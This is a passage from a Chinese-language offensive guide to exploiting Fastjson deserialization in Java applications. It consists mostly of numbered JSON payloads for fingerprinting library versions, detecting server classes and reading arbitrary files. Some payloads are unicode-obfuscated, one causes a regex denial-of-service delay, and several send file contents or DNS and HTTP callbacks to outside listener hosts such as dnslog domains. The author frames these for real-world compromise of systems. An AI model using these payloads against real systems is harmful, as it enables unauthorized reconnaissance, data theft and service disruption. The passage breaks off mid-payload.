1{&quot;page&quot;:{&quot;pageNumber&quot;:1,&quot;pageSize&quot;:1,&quot;zero&quot;:{&quot;@type&quot;:&quot;java.lang.Exception&quot;,&quot;@type&quot;:&quot;org.XxException&quot;}}} 只有1.2.25&lt;=version&lt;=1.2.80的时候会报错，其他情况包括1.1和2.0的版本都是不会报错的。 2.2.9 判断1.2.69&lt;=version&lt;=1.2.83payload22： 1{&quot;page&quot;:{&quot;pageNumber&quot;:1,&quot;pageSize&quot;:1,&quot;zero&quot;:{&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,&quot;@type&quot;:&quot;java.io.ByteArrayOutputStream&quot;}}} 如果报错（autoType is not support. java.io.ByteArrayOutputStream），说明版本处于1.2.69和1.2.83之间；如果不报错，说明处于1.2.24到1.2.68之间。 2.2.10 判断1.2.48&lt;=version&lt;=1.2.83payload23： 1{&quot;a&quot;:{&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;},&quot;b&quot;:{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;}} 大部分情况下，如果报错，说明版本处于1.2.48到1.2.83，但是有时候也可能因为环境本身而出现奇奇怪怪的问题，比如我这里1.2.24也报错，只是报错内容不同：1.2.47也报错，报错内容和前两者都不同：由于我们不知道报错的详细信息，因此感觉不能作为一个精确判断的方法。我后来又拿之前的demo进行测试，发现符合结论，师傅们利用的时候须要注意。 2.2.11 判断version=1.2.24payload24： 1{&quot;zero&quot;: {&quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;}} 按照@kezibei师傅给出的结论，这个payload只有1.2.24是不报错的，但是我本地靶场环境1.2.24也报错，只是和其他版本的不同：我又拿demo测试了下，发现符合结论： 2.3 延迟判断法2.3.1 浅蓝正则ddos探测法：1.2.36&lt;=version&lt;=1.2.63_noneautotypepayload25： 1{&quot;regex&quot;:{&quot;$ref&quot;:&quot;$[blue rlike '^[a-zA-Z]+(([a-zA-Z ])?[a-zA-Z]*)*$']&quot;},&quot;blue&quot;:&quot;aaa!&quot;} 该payload慎用，可能会影响业务系统，实战中应当逐步加a，不要一上来就输入一堆a。有延迟，说明版本处于1.2.36和1.2.63_noneautotype之间。尽管需要慎用，但是该payload的魅力还是很大的，一旦成功说明该系统很有可能可以拿下该系统权限。 2.3.2 jndi请求延迟探测法Tips：可以在ldap://ip后面加上端口，这样就可以探测内外端口开放情况了，类似ssrf。 2.3.2.1 判断1.2.4&lt;=version&lt;=1.2.47payload26（组合拳）： 1{&quot;name&quot;:{&quot;\\u0040\\u0074\\u0079\\u0070\\u0065&quot;:&quot;\\u006a\\u0061\\u0076\\u0061\\u002e\\u006c\\u0061\\u006e\\u0067\\u002e\\u0043\\u006c\\u0061\\u0073\\u0073&quot;,&quot;\\u0076\\u0061\\u006c&quot;:&quot;\\u0063\\u006f\\u006d\\u002e\\u0073\\u0075\\u006e\\u002e\\u0072\\u006f\\u0077\\u0073\\u0065\\u0074\\u002e\\u004a\\u0064\\u0062\\u0063\\u0052\\u006f\\u0077\\u0053\\u0065\\u0074\\u0049\\u006d\\u0070\\u006c&quot;},&quot;x&quot;:{&quot;\\u0040\\u0074\\u0079\\u0070\\u0065&quot;:&quot;\\u0063\\u006f\\u006d\\u002e\\u0073\\u0075\\u006e\\u002e\\u0072\\u006f\\u0077\\u0073\\u0065\\u0074\\u002e\\u004a\\u0064\\u0062\\u0063\\u0052\\u006f\\u0077\\u0053\\u0065\\u0074\\u0049\\u006d\\u0070\\u006c&quot;,&quot;\\u0064\\u0061\\u0074\\u0061\\u0053\\u006f\\u0075\\u0072\\u0063\\u0065\\u004e\\u0061\\u006d\\u0065&quot;:&quot;ldap://1.2.3.4/test111&quot;,&quot;autoCommit&quot;:true}} 1{&quot;name&quot;:{&quot;\\u0040\\u0074\\u0079\\u0070\\u0065&quot;:&quot;\\u006a\\u0061\\u0076\\u0061\\u002e\\u006c\\u0061\\u006e\\u0067\\u002e\\u0043\\u006c\\u0061\\u0073\\u0073&quot;,&quot;\\u0076\\u0061\\u006c&quot;:&quot;\\u0063\\u006f\\u006d\\u002e\\u0073\\u0075\\u006e\\u002e\\u0072\\u006f\\u0077\\u0073\\u0065\\u0074\\u002e\\u004a\\u0064\\u0062\\u0063\\u0052\\u006f\\u0077\\u0053\\u0065\\u0074\\u0049\\u006d\\u0070\\u006c&quot;},&quot;x&quot;:{&quot;\\u0040\\u0074\\u0079\\u0070\\u0065&quot;:&quot;\\u0063\\u006f\\u006d\\u002e\\u0073\\u0075\\u006e\\u002e\\u0072\\u006f\\u0077\\u0073\\u0065\\u0074\\u002e\\u004a\\u0064\\u0062\\u0063\\u0052\\u006f\\u0077\\u0053\\u0065\\u0074\\u0049\\u006d\\u0070\\u006c&quot;,&quot;\\u0064\\u0061\\u0074\\u0061\\u0053\\u006f\\u0075\\u0072\\u0063\\u0065\\u004e\\u0061\\u006d\\u0065&quot;:&quot;ldap://127.0.0.1/test111&quot;,&quot;autoCommit&quot;:true}} 先用第一个，再用第二个，如果第一个响应时间很长，而第二个较短，则说明版本： 2.3.2.2 判断1.1.16&lt;=version&lt;=1.2.24payload27（组合拳）： 1{&quot;username&quot;:{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://1.2.3.4/POC&quot;,&quot;autoCommit&quot;:true}} 1{&quot;username&quot;:{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://127.0.0.1/POC&quot;,&quot;autoCommit&quot;:true}} 和payload26一样，如果下面的比上面的响应快说明版本处于1.1.16和1.2.24之间；1.1.15我本地测试的时候响应很快但是报错Duplicate field name &quot;matchColumn_asm_prefix__&quot; with signature &quot;[C&quot; in class file Fastjson_ASM_JdbcRowSetImpl_1。 2.3.2.3 变种：判断1.1.16&lt;=version&lt;=1.2.11如果对方用的是JSON.parseObject，那么payload27还有变种。payload28（组合拳）： 1{&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;,{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://1.2.3.4/POC&quot;, &quot;autoCommit&quot;:true}}&quot;&quot;} 1{&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;,{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://127.0.0.1/POC&quot;, &quot;autoCommit&quot;:true}}&quot;&quot;} 如果下面比上面响应快，说明版本处于1.1.16和1.2.11之间。 2.3.2.4 判断1.2.28&lt;=version&lt;=1.2.47payload29（组合拳）： 1{&quot;a&quot;:{&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;},&quot;b&quot;:{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://1.2.3.4/POC&quot;,&quot;autoCommit&quot;:true}} 1{&quot;a&quot;:{&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;},&quot;b&quot;:{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://127.0.0.1/POC&quot;,&quot;autoCommit&quot;:true}} 如果下面比上面响应快，说明版本处于1.2.28和1.2.47之间。 2.3.2.5 变种：判断1.2.9&lt;=version&lt;=1.2.11如果对方用的是JSON.parseObject，那么payload29还有变种。payload30（组合拳）： 1{&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;,&quot;a&quot;:{&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;},&quot;b&quot;:{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://1.2.3.4/POC&quot;,&quot;autoCommit&quot;:true}} 1{&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;,&quot;a&quot;:{&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;},&quot;b&quot;:{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://127.0.0.1/POC&quot;,&quot;autoCommit&quot;:true}} 如果下面比上面响应快，说明版本处于1.2.9和1.2.11之间。 2.4 关键版本探测2.4.1 v1.2.24直接用2.3中所提到的延时判断方法即可。 2.4.2 v1.2.47payload31： 1{&quot;username&quot;:{&quot;@type&quot;: &quot;java.net.InetSocketAddress&quot;{&quot;address&quot;:,&quot;val&quot;:&quot;rylxkswlfg.dgrh3.cn&quot;}}} 或者： 1[{&quot;@type&quot;: &quot;java.lang.Class&quot;,&quot;val&quot;: &quot;java.io.ByteArrayOutputStream&quot;},{&quot;@type&quot;: &quot;java.io.ByteArrayOutputStream&quot;},{&quot;@type&quot;: &quot;java.net.InetSocketAddress&quot;{&quot;address&quot;:,&quot;val&quot;:&quot;rylxkswlfg.dgrh3.cn&quot;}}] 都是可以的： 2.4.3 v1.2.68payload32： 1[{&quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;,&quot;@type&quot;: &quot;java.io.ByteArrayOutputStream&quot;},{&quot;@type&quot;: &quot;java.io.ByteArrayOutputStream&quot;},{&quot;@type&quot;: &quot;java.net.InetSocketAddress&quot;{&quot;address&quot;:,&quot;val&quot;: &quot;mwhajokbdd.dgrh3.cn&quot;}}] 2.4.4 v1.2.80与v1.2.83需要准备两个dnslog地址，我这里yakit上开一个dnslog.cn开一个。payload33： 1[{&quot;@type&quot;: &quot;java.lang.Exception&quot;,&quot;@type&quot;: &quot;com.alibaba.fastjson.JSONException&quot;,&quot;x&quot;: {&quot;@type&quot;: &quot;java.net.InetSocketAddress&quot;{&quot;address&quot;:,&quot;val&quot;: &quot;xfjdbd.dnslog.cn&quot;}}},{&quot;@type&quot;: &quot;java.lang.Exception&quot;,&quot;@type&quot;: &quot;com.alibaba.fastjson.JSONException&quot;,&quot;message&quot;: {&quot;@type&quot;: &quot;java.net.InetSocketAddress&quot;{&quot;address&quot;:,&quot;val&quot;: &quot;uawcowbohf.dgrh3.cn&quot;}}}] 如果第一个收到响应而第二个没有收到，说明版本为1.2.80：如果两个都收到了，说明版本是1.2.83： 三、探测服务器环境3.1 空值判断法待探测列表如下： 12345org.springframework.web.bind.annotation.RequestMappingorg.apache.catalina.startup.Tomcatgroovy.lang.GroovyShellcom.mysql.jdbc.Driverjava.net.http.HttpClient payload34： 1{&quot;z&quot;: {&quot;@type&quot;: &quot;java.lang.Class&quot;,&quot;val&quot;: &quot;org.springframework.web.bind.annotation.RequestMapping&quot;}} 如果系统存在这个类，会返回一个类实例；如果不存在会返回null。例如： 3.2 dnslog回显判断法payload35： 1{&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:{&quot;@type&quot;:&quot;java.lang.String&quot;{&quot;@type&quot;:&quot;java.util.Locale&quot;,&quot;val&quot;:{&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;,{&quot;@type&quot;: &quot;java.lang.String&quot;&quot;@type&quot;:&quot;java.util.Locale&quot;,&quot;language&quot;:{&quot;@type&quot;:&quot;java.lang.String&quot;{1:{&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.mysql.jdbc.Driver&quot;}},&quot;country&quot;:&quot;aaa.qmc8xj4s.dnslog.pw&quot;}}} 只有MacOS可以ping带花括号的域名，Linux和Windows会报错，所以该payload需要特定环境才可以。 3.3 报错回显判断法payload36： 1{&quot;x&quot;: {&quot;@type&quot;: &quot;java.lang.Character&quot;{&quot;@type&quot;: &quot;java.lang.Class&quot;,&quot;val&quot;: &quot;com.mysql.jdbc.Driver&quot;}} 四、文件读取4.1 fastjson【1.2.73&lt;=version&lt;=1.2.80】4.1.1 aspectjtools4.1.1.1 直接回显法payload37（组合拳）：可以分三次打： 1234{ &quot;@type&quot;:&quot;java.lang.Exception&quot;, &quot;@type&quot;:&quot;org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException&quot;} 1{&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:{&quot;@type&quot;:&quot;java.lang.String&quot;{&quot;@type&quot;:&quot;java.util.Locale&quot;,&quot;val&quot;:{&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;,{ &quot;@type&quot;:&quot;java.lang.String&quot;&quot;@type&quot;:&quot;org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException&quot;,&quot;newAnnotationProcessorUnits&quot;:[{}]}}} 12345678{ &quot;username&quot;:{ &quot;@type&quot;:&quot;org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit&quot;, &quot;@type&quot;:&quot;org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit&quot;, &quot;fileName&quot;:&quot;c:/windows/win.ini&quot; }, &quot;password&quot;:&quot;admin&quot;} 也可以直接利用JSON.parse可以解析[]的特性直接一次打： 1[{&quot;@type&quot;:&quot;java.lang.Exception&quot;,&quot;@type&quot;:&quot;org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException&quot;},{&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:{&quot;@type&quot;:&quot;java.lang.String&quot;{&quot;@type&quot;:&quot;java.util.Locale&quot;,&quot;val&quot;:{&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;,{&quot;@type&quot;:&quot;java.lang.String&quot;&quot;@type&quot;:&quot;org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException&quot;,&quot;newAnnotationProcessorUnits&quot;:[{}]}}},{&quot;username&quot;:{&quot;@type&quot;:&quot;org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit&quot;,&quot;@type&quot;:&quot;org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit&quot;,&quot;fileName&quot;:&quot;c:/windows/win.ini&quot;},&quot;password&quot;:&quot;admin&quot;}] 4.1.1.2 报错回显法payload38： 1[{&quot;@type&quot;:&quot;java.lang.Exception&quot;,&quot;@type&quot;:&quot;org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException&quot;},{&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:{&quot;@type&quot;:&quot;java.lang.String&quot;{&quot;@type&quot;:&quot;java.util.Locale&quot;,&quot;val&quot;:{&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;,{&quot;@type&quot;:&quot;java.lang.String&quot;&quot;@type&quot;:&quot;org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException&quot;,&quot;newAnnotationProcessorUnits&quot;:[{}]}}},{&quot;username&quot;:{&quot;@type&quot;:&quot;java.lang.Character&quot;{&quot;c&quot;:{&quot;@type&quot;:&quot;org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit&quot;,&quot;@type&quot;:&quot;org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit&quot;,&quot;fileName&quot;:&quot;c:/windows/win.ini&quot;}},&quot;password&quot;:&quot;admin&quot;}] 4.1.1.3 dnslog回显法（需要对方为mac环境且dnslog平台支持特殊符号）payload39： 1[{&quot;@type&quot;:&quot;java.lang.Exception&quot;,&quot;@type&quot;:&quot;org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException&quot;},{&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:{&quot;@type&quot;:&quot;java.lang.String&quot;{&quot;@type&quot;:&quot;java.util.Locale&quot;,&quot;val&quot;:{&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;,{&quot;@type&quot;:&quot;java.lang.String&quot;&quot;@type&quot;:&quot;org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException&quot;,&quot;newAnnotationProcessorUnits&quot;:[{}]}}},{&quot;username&quot;:{&quot;@type&quot;:&quot;org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit&quot;,&quot;@type&quot;:&quot;org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit&quot;,&quot;fileName&quot;:&quot;1.txt&quot;},&quot;password&quot;:{&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:{&quot;@type&quot;:&quot;java.lang.String&quot;{&quot;@type&quot;:&quot;java.util.Locale&quot;,&quot;val&quot;:{&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;,{&quot;@type&quot;: &quot;java.lang.String&quot;&quot;@type&quot;:&quot;java.util.Locale&quot;,&quot;language&quot;:{&quot;@type&quot;:&quot;java.lang.String&quot;{&quot;$ref&quot;:&quot;$&quot;},&quot;country&quot;:&quot;aaa.qmc8xj4s.dnslog.pw&quot;}}}}] 但是只有mac才支持ping带花括号的域名，所以我Windows这里会提示deserialize inet adress error： 4.1.1.4 httplog回显法（另需ognl&gt;=2.7以及commons-io&gt;=2.0）分两次打。 payload40（组合拳）： 1[{&quot;@type&quot;:&quot;java.lang.Exception&quot;,&quot;@type&quot;:&quot;org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException&quot;},{&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:{&quot;@type&quot;:&quot;java.lang.String&quot;{&quot;@type&quot;:&quot;java.util.Locale&quot;,&quot;val&quot;:{&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;,{&quot;@type&quot;:&quot;java.lang.String&quot;&quot;@type&quot;:&quot;org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException&quot;,&quot;newAnnotationProcessorUnits&quot;:[{}]}}},{&quot;username&quot;:{&quot;@type&quot;:&quot;org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit&quot;,&quot;@type&quot;:&quot;org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit&quot;,&quot;fileName&quot;:&quot;test&quot;},&quot;password&quot;:&quot;admin&quot;}] 1{&quot;su14&quot;:{&quot;@type&quot;:&quot;java.lang.Exception&quot;,&quot;@type&quot;:&quot;ognl.OgnlException&quot;},&quot;su15&quot;:{&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:{&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;,{&quot;@type&quot;:&quot;java.lang.String&quot;&quot;@type&quot;:&quot;ognl.OgnlException&quot;,&quot;_evaluation&quot;:&quot;&quot;}},&quot;su16&quot;:{&quot;@type&quot;:&quot;ognl.Evaluation&quot;,&quot;node&quot;:{&quot;@type&quot;:&quot;ognl.ASTMethod&quot;,&quot;p&quot;:{&quot;@type&quot;:&quot;ognl.OgnlParser&quot;,&quot;stream&quot;:{&quot;@type&quot;:&quot;org.apache.commons.io.input.BOMInputStream&quot;,&quot;delegate&quot;:{&quot;@type&quot;:&quot;org.apache.commons.io.input.ReaderInputStream&quot;,&quot;reader&quot;:{&quot;@type&quot;:&quot;jdk.nashorn.api.scripting.URLReader&quot;,&quot;url&quot;:{&quot;@type&quot;:&quot;java.lang.String&quot;{&quot;@type&quot;:&quot;java.util.Locale&quot;,&quot;val&quot;:{&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;,{&quot;@type&quot;:&quot;java.lang.String&quot;&quot;@type&quot;:&quot;java.util.Locale&quot;,&quot;language&quot;:&quot;http://127.0.0.1:8085/?test&quot;,&quot;country&quot;:{&quot;@type&quot;:&quot;java.lang.String&quot;[{&quot;@type&quot;:&quot;org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit&quot;,&quot;fileName&quot;:&quot;C:/Windows/win.ini&quot;}]}}},&quot;charsetName&quot;:&quot;UTF-8&quot;,&quot;bufferSize&quot;:1024},&quot;boms&quot;:[{&quot;@type&quot;:&quot;org.apache.commons.io.ByteOrderMark&quot;,&quot;charsetName&quot;:&quot;UTF-8&quot;,&quot;bytes&quot;:[36]}]}}}},&quot;su17&quot;:{&quot;$ref&quot;:&quot;$.su16.node.p.stream&quot;},&quot;su18&quot;:{&quot;$ref&quot;:&quot;$.su17.bOM.bytes&quot;}} 我这里实际测试过程中，文件中有中文字符的时候出现了乱码： 我的解决方法是，使用yakit的端口监听器： yakit真是太好用了，有木有~ 4.1.2 aspectjtools+xalan（&gt;=2.4.0）+dom4j（版本无限制）4.1.2.1 直接回显法分五次打，中间报错不用管。 payload41（组合拳）： 1[{&quot;@type&quot;:&quot;java.lang.Exception&quot;,&quot;@type&quot;:&quot;org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException&quot;},{&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:{&quot;@type&quot;:&quot;java.lang.String&quot;{&quot;@type&quot;:&quot;java.util.Locale&quot;,&quot;val&quot;:{&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;,{&quot;@type&quot;:&quot;java.lang.String&quot;&quot;@type&quot;:&quot;org.aspectj.org.eclipse.jdt.internal.compiler.lookup.SourceTypeCollisionException&quot;,&quot;newAnnotationProcessorUnits&quot;:[{}]}}},{&quot;username&quot;:{&quot;@type&quot;:&quot;org.aspectj.org.eclipse.jdt.internal.compiler.env.ICompilationUnit&quot;,&quot;@type&quot;:&quot;org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit&quot;,&quot;fileName&quot;:&quot;test&quot;},&quot;password&quot;:&quot;admin&quot;}] 1{&quot;@type&quot;:&quot;java.lang.Exception&quot;,&quot;@type&quot;:&quot;org.apache.xml.dtm.DTMConfigurationException&quot;,&quot;locator&quot;:{}} 1{&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:{&quot;@type&quot;:&quot;java.lang.String&quot;{&quot;@type&quot;:&quot;java.util.Locale&quot;,&quot;val&quot;:{&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;,{&quot;@type&quot;:&quot;java.lang.String&quot;&quot;@type&quot;:&quot;org.apache.xml.dtm.DTMConfigurationException&quot;,&quot;locator&quot;:{}}}} 1{&quot;su14&quot;:{&quot;@type&quot;:&quot;javax.xml.transform.SourceLocator&quot;,&quot;@type&quot;:&quot;org.apache.xpath.objects.XNodeSetForDOM&quot;,&quot;nodeIter&quot;:{&quot;@type&quot;:&quot;org.apache.xpath.NodeSet&quot;},&quot;xctxt&quot;:{&quot;@type&quot;:&quot;org.apache.xpath.XPathContext&quot;,&quot;primaryReader&quot;:{&quot;@type&quot;:&quot;org.dom4j.io.XMLWriter&quot;,&quot;entityResolver&quot;:{&quot;@type&quot;:&quot;org.dom4j.io.SAXContentHandler&quot;,&quot;inputSource&quot;:{&quot;byteStream&quot;:{&quot;@type&quot;:&quot;java.io.InputStream&quot;}}}}}}} 1{&quot;su15&quot;:{&quot;@type&quot;:&quot;java.io.InputStream&quot;,&quot;@type&quot;:&quot;org.apache.commons.io.input.BOMInputStream&quot;,&quot;delegate&quot;:{&quot;@type&quot;:&quot;org.apache.commons.io.input.ReaderInputStream&quot;,&quot;reader&quot;:{&quot;@type&quot;:&quot;jdk.nashorn.api.scripting.URLReader&quot;,&quot;url&quot;:&quot;file:///C:/Users/whoami/Desktop/testtest.txt&quot;},&quot;charsetName&quot;:&quot;UTF-8&quot;,&quot;bufferSize&quot;:1024},&quot;boms&quot;:[{&quot;@type&quot;:&quot;org.apache.commons.io.ByteOrderMark&quot;,&quot;charsetName&quot;:&quot;UTF-8&quot;,&quot;bytes&quot;:[98]}]}} 4.1.2.2 httplog回显法修改4.1.2.1中最后一步为如下payload： 1{&quot;@type&quot;:&quot;java.io.InputStream&quot;,&quot;@type&quot;:&quot;org.apache.commons.io.input.BOMInputStream&quot;,&quot;delegate&quot;:{&quot;@type&quot;:&quot;org.apache.commons.io.input.ReaderInputStream&quot;,&quot;reader&quot;:{&quot;@type&quot;:&quot;jdk.nashorn.api.scripting.URLReader&quot;,&quot;url&quot;:{&quot;@type&quot;:&quot;java.lang.String&quot;{&quot;@type&quot;:&quot;java.util.Locale&quot;,&quot;val&quot;:{&quot;@type&quot;:&quot;com.alibaba.fastjson.JSONObject&quot;,{&quot;@type&quot;:&quot;java.lang.String&quot;&quot;@type&quot;:&quot;java.util.Locale&quot;,&quot;language&quot;:&quot;http://127.0.0.1:8085/?test&quot;,&quot;country&quot;:{&quot;@type&quot;:&quot;java.lang.String&quot;[{&quot;@type&quot;:&quot;org.aspectj.org.eclipse.jdt.internal.core.BasicCompilationUnit&quot;,&quot;fileName&quot;:&quot;C:/Users/whoami/Desktop/testtest.txt&quot;}]}}},&quot;charsetName&quot;:&quot;UTF-8&quot;,&quot;bufferSize&quot;:1024},&quot;boms&quot;:[{&quot;@type&quot;:&quot;org.apache.commons.io.ByteOrderMark&quot;,&quot;charsetName&quot;:&quot;UTF-8&quot;,&quot;bytes&quot;:[98]}]} 我这里demo复现是成功的，但是靶场没有成功，如果有兄弟成功了可以公众号后台直接发消息，我看到立马就会回复，并将这部分在我的博客中更新。 4.2 fastjson【1.2.37&lt;=version&lt;=1.2.68】4.2.1 blackhat2021-getBom()原版（适用场景有限）payload42： 123456789101112131415161718192021{ &quot;abc&quot;:{&quot;@type&quot;: &quot;java.lang.AutoCloseable&quot;, &quot;@type&quot;: &quot;org.apache.commons.io.input.BOMInputStream&quot;, &quot;delegate&quot;: {&quot;@type&quot;: &quot;org.apache.commons.io.input.ReaderInputStream&quot;, &quot;reader&quot;: { &quot;@type&quot;: &quot;jdk.nashorn.api.scripting.URLReader&quot;, &quot;url&quot;: &quot;file:///C:/Windows/win.ini&quot; }, &quot;charsetName&quot;: &quot;UTF-8&quot;, &quot;bufferSize&quot;: 1024 },&quot;boms&quot;: [ { &quot;@type&quot;: &quot;org.apache.commons.io.ByteOrderMark&quot;, &quot;charsetName&quot;: &quot;UTF-8&quot;, &quot;bytes&quot;: [ 59 ] } ] }, &quot;address&quot; : {&quot;$ref&quot;:&quot;$.abc.BOM&quot;}} 它会拿win.ini的内容转成int数组，然后拿ByteOrderMark里的bytes挨个字节遍历去比对，如果遍历过程有比对错误的getBom就会返回一个null，如果遍历结束，没有比对错误那就会返回一个ByteOrderMark对象。所以这里文件读取成功的标志应该是getBom返回结果不为null。 有点sql注入中布尔盲注的味道，哈哈。 附上读取文件内容到字节数组的代码： 1234567891011121314151617181920212223242526272829303132import java.io.FileReader;import java.io.IOException;public class str2bytes { public static String fileToString(String path) throws IOException { FileReader reader = new FileReader(path); StringBuilder stringBuilder = new StringBuilder(); char[] buffer = new char[10]; int size; while ((size = reader.read(buffer)) != -1) { stringBuilder.append(buffer, 0, size); } return stringBuilder.toString(); } public static void main(String[] args) throws IOException { String str = fileToString(&quot;C:\\\\Windows\\\\win.ini&quot;); byte[] byteArray = str.getBytes(&quot;UTF-8&quot;); boolean first = true; for (byte b : byteArray) { int intValue = b &amp; 0xFF; if (first) { System.out.print(intValue); first = false; } else { System.out.print(&quot;, &quot; + intValue); } } }}//59, 32, 102, 111, 114, 32, 49, 54, 45, 98, 105, 116, 32, 97, 112, 112, 32, 115, 117, 112, 112, 111, 114, 116, 13, 10, 91, 102, 111, 110, 116, 115, 93, 13, 10, 91, 101, 120, 116, 101, 110, 115, 105, 111, 110, 115, 93, 13, 10, 91, 109, 99, 105, 32, 101, 120, 116, 101, 110, 115, 105, 111, 110, 115, 93, 13, 10, 91, 102, 105, 108, 101, 115, 93, 13, 10, 91, 77, 97, 105, 108, 93, 13, 10, 77, 65, 80, 73, 61, 49, 13, 10 4.2.2 blackhat2021-getBom()浅蓝师傅改版（几乎适配所有场景）payload43： 1{&quot;abc&quot;:{&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,&quot;@type&quot;:&quot;org.apache.commons.io.input.BOMInputStream&quot;,&quot;delegate&quot;:{&quot;@type&quot;:&quot;org.apache.commons.io.input.ReaderInputStream&quot;,&quot;reader&quot;:{&quot;@type&quot;:&quot;jdk.nashorn.api.scripting.URLReader&quot;,&quot;url&quot;:&quot;file:///C:/Users/whoami/Desktop/testtest.txt&quot;},&quot;charsetName&quot;:&quot;UTF-8&quot;,&quot;bufferSize&quot;:1024},&quot;boms&quot;:[{&quot;@type&quot;:&quot;org.apache.commons.io.ByteOrderMark&quot;,&quot;charsetName&quot;:&quot;UTF-8&quot;,&quot;bytes&quot;:[98]}]},&quot;address&quot;:{&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,&quot;@type&quot;:&quot;org.apache.commons.io.input.CharSequenceReader&quot;,&quot;charSequence&quot;:{&quot;@type&quot;:&quot;java.lang.String&quot;{&quot;$ref&quot;:&quot;$.abc.BOM[0]&quot;},&quot;start&quot;:0,&quot;end&quot;:0},&quot;xxx&quot;:{&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;,&quot;@type&quot;:&quot;org.apache.commons.io.input.BOMInputStream&quot;,&quot;delegate&quot;:{&quot;@type&quot;:&quot;org.apache.commons.io.input.ReaderInputStream&quot;,&quot;reader&quot;:{&quot;@type&quot;:&quot;jdk.nashorn.api.scripting.URLReader&quot;,&quot;url&quot;:&quot;http://testhhh.okdplvnqdu.dgrh3.cn/&quot;},&quot;charsetName&quot;:&quot;UTF-8&quot;,&quot;bufferSize&quot;:1024},&quot;boms&quot;:[{&quot;@type&quot;:&quot;org.apache.commons.io.ByteOrderMark&quot;,&quot;charsetName&quot;